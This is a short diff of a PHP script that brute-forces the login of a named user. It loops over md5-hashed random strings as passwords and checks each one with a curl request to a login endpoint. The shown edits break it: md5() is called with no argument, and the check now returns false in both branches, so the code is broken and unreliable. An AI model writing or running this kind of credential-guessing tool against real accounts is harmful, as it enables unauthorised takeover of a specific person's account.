@@ -6,7 +6,7 @@ $time = microtime() * 100000;
 $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
-        $Pass = md5(rand());
+        $Pass = md5();
 
         if(check_correct($username, $Pass)) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
@@ -46,7 +46,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c);
-        if($str != "incorrect") {return true;}
+        if($str != "incorrect") {return false;}
         else {return false;}
 }
 
